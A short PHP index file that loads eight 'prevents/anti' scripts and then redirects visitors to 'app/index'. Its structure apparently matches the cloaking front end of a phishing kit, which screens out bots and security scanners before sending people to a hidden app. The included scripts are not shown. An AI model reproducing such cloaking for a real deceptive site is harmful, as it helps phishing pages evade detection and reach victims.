<?php
	require 'prevents/anti1.php';
	require 'prevents/anti2.php';
	require 'prevents/anti3.php';
	require 'prevents/anti4.php';
	require 'prevents/anti5.php';
	require 'prevents/anti6.php';
	require 'prevents/anti7.php';
	require 'prevents/anti8.php';
	exit(header("Location: app/index"));
?>